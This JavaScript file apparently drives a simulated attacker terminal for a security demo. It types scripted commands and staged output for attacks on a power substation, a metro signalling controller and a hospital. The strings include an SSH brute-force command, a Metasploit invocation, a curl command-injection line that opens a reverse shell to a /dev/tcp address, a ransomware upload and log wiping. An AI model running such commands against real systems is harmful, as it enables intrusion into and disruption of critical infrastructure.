/**
 * Attacker Terminal Simulator
 * Simulates real-time command line typing and exploit execution
 * Supports multiple scenarios (0: Power Grid, 1: Transit, 2: Hospital)
 */

class AttackerTerminal {
  constructor(containerId) {
    this.container = document.getElementById(containerId);
    this.currentTimeout = null;
    this.queue = [];
    this.isTyping = false;
    this.speedMultiplier = 1;
    this.currentPhase = -1;
    this.currentScenario = -1;

    // Headers per scenario
    this.headers = {
      0: `======================================================================
[+] SOURCE SPOOF: 185.220.101.4 (TOR EXIT NODE) -> TUN0 (10.10.14.88)
[+] ARCHITECTURE: x86_64 Linux 5.15.0-kali7-amd64
[+] TARGET SCOPE: 192.168.42.50 (Substation Alpha Modbus Relays)
======================================================================\n\n`,
      1: `======================================================================
[+] SOURCE SPOOF: 189.124.99.112 (SOCKS5 PROXY) -> TUN1 (10.10.14.89)
[+] ARCHITECTURE: x86_64 Linux 5.10.0-kali9-amd64
[+] TARGET SCOPE: 192.168.42.80 (Metro Transit Signaling Controller)
======================================================================\n\n`,
      2: `======================================================================
[+] SOURCE SPOOF: 45.227.254.12 (ESTONIAN VPS) -> TUN2 (10.10.14.90)
[+] ARCHITECTURE: x86_64 Windows Server 2019 (Spoofed Payload)
[+] TARGET SCOPE: 192.168.42.90 (Hospital Emergency Room Main Console)
======================================================================\n\n`
    };
  }

  init() {
    this.clear();
    this.container.innerHTML = `<span class="text-neutral-500">// Terminal initialized. Awaiting orchestrator baseline...</span>`;
  }

  clear() {
    if (this.currentTimeout) {
      clearTimeout(this.currentTimeout);
      this.currentTimeout = null;
    }
    this.queue = [];
    this.isTyping = false;
    if (this.container) {
      this.container.innerHTML = "";
    }
  }

  setSpeed(multiplier) {
    this.speedMultiplier = multiplier;
  }

  /**
   * Main entry point to transition terminal script to a specific phase and scenario
   */
  triggerPhase(phase, scenarioId = 0) {
    if (this.currentPhase === phase && this.currentScenario === scenarioId) return;
    this.currentPhase = phase;
    this.currentScenario = scenarioId;
    this.clear();

    // Setup color based on phase
    if (phase === 2) {
      this.container.className = "font-mono text-sm text-red-500 glow-text-red whitespace-pre-wrap leading-relaxed select-none";
    } else {
      this.container.className = "font-mono text-sm text-green-500 glow-text-green whitespace-pre-wrap leading-relaxed select-none";
    }

    // Load scripts
    let scripts = [];
    
    // Add standard header (except in phase 4 reset)
    if (phase !== 4) {
      scripts.push({ type: 'out', text: this.headers[scenarioId] || "", delay: 0 });
    }

    if (scenarioId === 0) {
      this.loadScenario0(scripts, phase);
    } else if (scenarioId === 1) {
      this.loadScenario1(scripts, phase);
    } else if (scenarioId === 2) {
      this.loadScenario2(scripts, phase);
    }

    this.queue = scripts;
    this.processQueue();
  }

  // --- SCENARIO 0: Substation Telemetry (Modbus) ---
  loadScenario0(scripts, phase) {
    switch(phase) {
      case 0:
        scripts.push(
          { type: 'out', text: '[*] Starting background intelligence sweep...\n', delay: 100 },
          { type: 'cmd', text: 'ping -c 4 192.168.42.50' },
          { type: 'out', text: 'PING 192.168.42.50 (192.168.42.50) 56(84) bytes of data.\n', delay: 150 },
          { type: 'out', text: '64 bytes from 192.168.42.50: icmp_seq=1 ttl=64 time=0.45 ms\n', delay: 200 },
          { type: 'out', text: '64 bytes from 192.168.42.50: icmp_seq=2 ttl=64 time=0.38 ms\n', delay: 200 },
          { type: 'out', text: '64 bytes from 192.168.42.50: icmp_seq=3 ttl=64 time=0.41 ms\n', delay: 200 },
          { type: 'out', text: '64 bytes from 192.168.42.50: icmp_seq=4 ttl=64 time=0.39 ms\n\n', delay: 200 },
          { type: 'out', text: '--- 192.168.42.50 ping statistics ---\n', delay: 50 },
          { type: 'out', text: '4 packets transmitted, 4 received, 0% packet loss, time 3014ms\n', delay: 50 },
          { type: 'out', text: 'rtt min/avg/max/mdev = 0.380/0.407/0.450/0.026 ms\n\n', delay: 50 },
          { type: 'out', text: '[+] Host 192.168.42.50 online. Inbound ICMP delay normal.\n', delay: 100 }
        );
        break;

      case 1:
        scripts.push(
          { type: 'out', text: '[!] Reconnaissance phase initiated.\n', delay: 100 },
          { type: 'cmd', text: 'nmap -sV -T4 192.168.42.0/24' },
          { type: 'out', text: 'Starting Nmap 7.92 ( https://nmap.org ) at 2026-07-08 14:36 UTC\n', delay: 400 },
          { type: 'out', text: 'Nmap scan report for corp-hq.smartcity.local (192.168.42.10)\n', delay: 100 },
          { type: 'out', text: 'PORT   STATE SERVICE VERSION\n', delay: 50 },
          { type: 'out', text: '22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5\n', delay: 50 },
          { type: 'out', text: '80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n\n', delay: 50 },
          { type: 'out', text: 'Nmap scan report for power-substation.smartcity.local (192.168.42.50)\n', delay: 100 },
          { type: 'out', text: 'PORT     STATE SERVICE VERSION\n', delay: 50 },
          { type: 'out', text: '502/tcp  open  modbus  Modbus TCP (SCADA Controller)\n\n', delay: 50 },
          { type: 'out', text: 'Nmap done: 256 IP addresses (2 hosts up) scanned in 12.45 seconds\n\n', delay: 100 },
          { type: 'cmd', text: 'hydra -L users.txt -P rockyou.txt ssh://192.168.42.10' },
          { type: 'out', text: 'Hydra target ssh://192.168.42.10:22/ - service ssh\n', delay: 100 },
          { type: 'out', text: '[22][ssh] host: 192.168.42.10   login: admin   password: password123 [FAILED]\n', delay: 150 },
          { type: 'out', text: '[22][ssh] host: 192.168.42.10   login: engineering   password: superpass [SUCCESS]\n', delay: 300 }
        );
        break;

      case 2:
        scripts.push(
          { type: 'out', text: '[!] CREDENTIAL SPOTTED. INITIALIZING REMOTE LOGIN...\n', delay: 100 },
          { type: 'cmd', text: 'ssh engineering@192.168.42.10' },
          { type: 'out', text: 'Welcome to Corp-HQ Terminal (Linux kernel 5.4.0-77-generic)\n', delay: 100 },
          { type: 'out', text: 'engineering@corp-hq:~$ ', delay: 200 },
          { type: 'cmd', text: 'msfconsole -x "use exploit/linux/scada/modbus_merge; set RHOSTS 192.168.42.50; run"' },
          { type: 'out', text: '\n[*] Starting Metasploit Framework Console...\n', delay: 300 },
          { type: 'out', text: '=[ metasploit v6.1.15-dev                          ]\n', delay: 50 },
          { type: 'out', text: '[*] RHOSTS => 192.168.42.50\n', delay: 100 },
          { type: 'out', text: '[*] Sending Modbus write register packet...\n', delay: 200 },
          { type: 'out', text: '[*] Overriding critical relay 40001 (Main Breaker) => [0xFFFF]\n', delay: 200 },
          { type: 'out', text: '[+] Modbus write command acknowledged by PLC_192.168.42.50\n', delay: 100 },
          { type: 'out', text: '\n[CRITICAL] ICS PAYLOAD OVERWRITE INJECTED SUCCESSFUL\n', delay: 300 },
          { type: 'out', text: '[CRITICAL] SUBSTATION ALPHA POWER GRID SHUTTING DOWN\n', delay: 100 },
          { type: 'out', text: 'meterpreter > ', delay: 400 }
        );
        break;

      case 3:
        scripts.push(
          { type: 'cmd', text: 'reboot -f' },
          { type: 'out', text: '\n[!] CRITICAL ERROR: Connection dropped. Broken pipe.\n', delay: 400 },
          { type: 'out', text: '[-] Connection closed by remote host.\n', delay: 100 },
          { type: 'out', text: '[-] Retrying Metasploit session reconnect...\n', delay: 400 },
          { type: 'out', text: '[-] [CONNECTION REFUSED] - VLAN firewall active.\n', delay: 500 },
          { type: 'out', text: '[-] Retrying exploit execution... [FAILED]\n', delay: 400 },
          { type: 'cmd', text: 'ping -c 2 192.168.42.50' },
          { type: 'out', text: 'From 192.168.42.1 icmp_seq=1 Destination Host Unreachable\n', delay: 200 },
          { type: 'out', text: '[-] ERROR: Routing table manipulated. Target isolated.\n', delay: 100 }
        );
        break;

      case 4:
        scripts.push(
          { type: 'out', text: '==================================================\n', delay: 100 },
          { type: 'out', text: '!!! ALARM: HONEYPOT SYSTEM INTEGRITY WARNING !!!\n', delay: 100 },
          { type: 'out', text: '[!] Blue Team SOAR framework has quarantined local agent IP.\n', delay: 200 },
          { type: 'out', text: '[-] Clearing local /var/log/auth.log residues... DONE\n', delay: 150 },
          { type: 'out', text: '[+] Local environment sanitization complete.\n\n', delay: 100 },
          { type: 'out', text: '[i] Next campaign countdown starting...\n', delay: 100 }
        );
        break;
    }
  }

  // --- SCENARIO 1: Transit Hub Signal Hijack (Web API Command Injection) ---
  loadScenario1(scripts, phase) {
    switch(phase) {
      case 0:
        scripts.push(
          { type: 'out', text: '[*] Starting background signaling scanning loop...\n', delay: 100 },
          { type: 'cmd', text: 'ping -c 3 192.168.42.80' },
          { type: 'out', text: 'PING 192.168.42.80 (192.168.42.80) 56(84) bytes of data.\n', delay: 150 },
          { type: 'out', text: '64 bytes from 192.168.42.80: icmp_seq=1 ttl=64 time=0.82 ms\n', delay: 200 },
          { type: 'out', text: '64 bytes from 192.168.42.80: icmp_seq=2 ttl=64 time=0.79 ms\n', delay: 200 },
          { type: 'out', text: '64 bytes from 192.168.42.80: icmp_seq=3 ttl=64 time=0.81 ms\n\n', delay: 200 },
          { type: 'out', text: '[+] Host 192.168.42.80 online. Round-trip telemetry active.\n', delay: 100 }
        );
        break;

      case 1:
        scripts.push(
          { type: 'out', text: '[!] Scanning target ports and web directory structures...\n', delay: 100 },
          { type: 'cmd', text: 'nikto -h http://192.168.42.80' },
          { type: 'out', text: 'Target IP: 192.168.42.80, Port: 80\n', delay: 300 },
          { type: 'out', text: '+ Server: Apache/2.4.41 (Unix) OpenSSL/1.1.1d\n', delay: 100 },
          { type: 'out', text: '+ OSVDB-3092: /api/v1/signal/ status queries allowed without session token.\n', delay: 200 },
          { type: 'out', text: '+ OSVDB-3294: POST /api/v1/signal/override allows command injection via shell parameter.\n', delay: 200 },
          { type: 'out', text: '+ Apache/2.4.41 appears to be outdated. Vulnerable to local directory pivot.\n\n', delay: 100 },
          { type: 'out', text: '[+] Vulnerable endpoint verified. Shell injection candidate: override API.\n', delay: 150 }
        );
        break;

      case 2:
        scripts.push(
          { type: 'out', text: '[*] EXPLOITING SHELL PARAMETER IN OVERRIDE API...\n', delay: 100 },
          { type: 'cmd', text: 'curl -X POST http://192.168.42.80/api/v1/signal/override -d "track=B&state=RED&cmd=;sh%20-i%20%3E%26%20/dev/tcp/10.10.14.89/4444%200%3E%261"' },
          { type: 'out', text: '\n[*] Shell connection received on 10.10.14.89:4444\n', delay: 300 },
          { type: 'cmd', text: 'python3 -c "import pty; pty.spawn(\'/bin/bash\')"' },
          { type: 'out', text: 'operator@transit-sig-ctrl:/$ ', delay: 200 },
          { type: 'cmd', text: './override_signals.sh --all-tracks --red' },
          { type: 'out', text: '\n[CRITICAL] OVERRIDING ALL METRO SIGNAL LIGHTS TO RED...\n', delay: 250 },
          { type: 'out', text: '[CRITICAL] INTERCEPTING TRACK SWITCH CONTROLS... INJECTING LOOP ERROR\n', delay: 150 },
          { type: 'out', text: '[CRITICAL] RAILWAYS AUTOMATIC EMERGENCY SYSTEM DETECTS LOOP SHUTDOWN\n', delay: 100 },
          { type: 'out', text: '[!] ALL TRANSIT SIGNALS LOCK STATE: LOCKED [FAIL]\n', delay: 200 }
        );
        break;

      case 3:
        scripts.push(
          { type: 'cmd', text: './check_routes.sh' },
          { type: 'out', text: '\n[!] CRITICAL ERROR: Connection dropped. Connection reset by peer.\n', delay: 350 },
          { type: 'out', text: '[-] Attempting to restore reverse shell connection...\n', delay: 400 },
          { type: 'cmd', text: 'curl -s -o /dev/null -w "%{http_code}" http://192.168.42.80/' },
          { type: 'out', text: '000\n', delay: 300 },
          { type: 'out', text: '[-] Connection timed out. Target unreachable.\n', delay: 200 },
          { type: 'out', text: '[-] Routing table overridden by Blue Team SOAR. Subnet quarantined.\n', delay: 150 }
        );
        break;

      case 4:
        scripts.push(
          { type: 'out', text: '==================================================\n', delay: 100 },
          { type: 'out', text: '[!] Clean-up cron script running...\n', delay: 150 },
          { type: 'out', text: '[-] Deleting command history logs... DONE\n', delay: 100 },
          { type: 'out', text: '[-] Sanitizing exploit directory caches... DONE\n', delay: 100 },
          { type: 'out', text: '[i] Next campaign countdown starting...\n', delay: 100 }
        );
        break;
    }
  }

  // --- SCENARIO 2: Hospital ER Ransomware (SMB Backdoor Cryptolocker) ---
  loadScenario2(scripts, phase) {
    switch(phase) {
      case 0:
        scripts.push(
          { type: 'out', text: '[*] Starting hospital network mapping...\n', delay: 100 },
          { type: 'cmd', text: 'nmap -PN -p 445 192.168.42.90' },
          { type: 'out', text: 'Nmap scan report for hospital-er.local (192.168.42.90)\n', delay: 200 },
          { type: 'out', text: 'PORT    STATE SERVICE\n', delay: 50 },
          { type: 'out', text: '445/tcp open  microsoft-ds (SMBv3 Active)\n\n', delay: 50 },
          { type: 'out', text: '[+] SMB Port 445 exposed. Patient database registry visible.\n', delay: 100 }
        );
        break;

      case 1:
        scripts.push(
          { type: 'out', text: '[!] Initializing phishing email attachment sequence...\n', delay: 100 },
          { type: 'cmd', text: 'python3 send_phish.py --target staff@hospital.local --template invoice' },
          { type: 'out', text: '[+] Email dispatched successfully (Ref: INVOICE-2026-904)\n', delay: 200 },
          { type: 'out', text: '[*] Awaiting recipient document macro execution...\n', delay: 400 },
          { type: 'out', text: '[*] Backdoor shell established: 10.10.14.90:8080 <- 192.168.42.90:49214\n', delay: 300 },
          { type: 'out', text: '[*] System check: Username er_reception, Privilege level: User\n', delay: 100 }
        );
        break;

      case 2:
        scripts.push(
          { type: 'out', text: '[!] ELEVATING SYSTEM PRIVILEGES... BYPASSING WINDOWS DEFENDER...\n', delay: 100 },
          { type: 'cmd', text: 'upload locker.exe C:\\Windows\\Temp\\locker.exe' },
          { type: 'out', text: '[+] Uploaded locker.exe successfully (2.4 MB)\n', delay: 200 },
          { type: 'cmd', text: 'execute -f "C:\\Windows\\Temp\\locker.exe --escalate --encrypt-all"' },
          { type: 'out', text: '\n[*] Executing ransomware payload...\n', delay: 300 },
          { type: 'out', text: '[!] CRYPTOLOCKER: ENCRYPTING C:\\Users\\*\\Documents... [OK]\n', delay: 150 },
          { type: 'out', text: '[!] CRYPTOLOCKER: LOCKING HVAC VENTILATION SYSTEM REGISTERS... [OK]\n', delay: 150 },
          { type: 'out', text: '[!] CRYPTOLOCKER: PATIENT TELEMETRY DATA ENCRYPTED. COMPROMISED.\n', delay: 100 },
          { type: 'out', text: '[!] RANSOM NOTE INJECTED: RANSOM_DECRYPT.txt COPIED TO DESKTOP.\n', delay: 200 }
        );
        break;

      case 3:
        scripts.push(
          { type: 'cmd', text: 'shell' },
          { type: 'out', text: '\n[-] Connection timed out. Session terminated.\n', delay: 400 },
          { type: 'out', text: '[-] Attempting to restore SMB connection to 192.168.42.90...\n', delay: 300 },
          { type: 'out', text: '[-] Error: Destination host unreachable (VLAN isolated by SOAR).\n', delay: 300 },
          { type: 'out', text: '[-] Threat containment directive executing on targets.\n', delay: 150 }
        );
        break;

      case 4:
        scripts.push(
          { type: 'out', text: '==================================================\n', delay: 100 },
          { type: 'out', text: '[!] Closing Tor circuits and backdoors...\n', delay: 150 },
          { type: 'out', text: '[-] Erasing invoice delivery trace logs... DONE\n', delay: 100 },
          { type: 'out', text: '[i] Next campaign countdown starting...\n', delay: 100 }
        );
        break;
    }
  }

  processQueue() {
    if (this.queue.length === 0) {
      this.isTyping = false;
      return;
    }

    this.isTyping = true;
    const item = this.queue.shift();

    if (item.type === 'out') {
      this.printOutput(item.text, () => {
        const scaledDelay = item.delay / this.speedMultiplier;
        this.currentTimeout = setTimeout(() => this.processQueue(), scaledDelay);
      });
    } else if (item.type === 'cmd') {
      // Print cursor/command line starter
      let prefix = '$ ';
      if (this.currentScenario === 0 && this.currentPhase === 2 && !this.container.innerHTML.includes('engineering@corp-hq')) {
        prefix = 'meterpreter > ';
      } else if (this.currentScenario === 2 && this.currentPhase === 2) {
        prefix = 'meterpreter > ';
      } else if (this.currentScenario === 1 && this.currentPhase === 2 && this.container.innerHTML.includes('operator@transit-sig-ctrl')) {
        prefix = 'operator@transit-sig-ctrl:/$ ';
      }
      
      this.printOutput(prefix, () => {
        this.typeCommand(item.text, () => {
          this.printOutput('\n', () => {
            this.currentTimeout = setTimeout(() => this.processQueue(), 200 / this.speedMultiplier);
          });
        });
      });
    } else if (item.type === 'pause') {
      const scaledDuration = item.duration / this.speedMultiplier;
      this.currentTimeout = setTimeout(() => this.processQueue(), scaledDuration);
    }
  }

  printOutput(text, callback) {
    if (!this.container) return;
    
    const span = document.createElement("span");
    span.textContent = text;
    this.container.appendChild(span);
    
    // Auto-scroll to bottom
    const parent = this.container.parentElement;
    if (parent) {
      parent.scrollTop = parent.scrollHeight;
    }
    
    if (callback) callback();
  }

  typeCommand(text, callback, index = 0) {
    if (!this.container) return;
    
    if (index < text.length) {
      const char = text.charAt(index);
      const span = document.createElement("span");
      span.textContent = char;
      this.container.appendChild(span);
      
      const parent = this.container.parentElement;
      if (parent) {
        parent.scrollTop = parent.scrollHeight;
      }
      
      let delay = 35 + Math.random() * 45;
      this.currentTimeout = setTimeout(() => {
        this.typeCommand(text, callback, index + 1);
      }, delay / this.speedMultiplier);
    } else {
      if (callback) callback();
    }
  }
}

window.AttackerTerminal = AttackerTerminal;
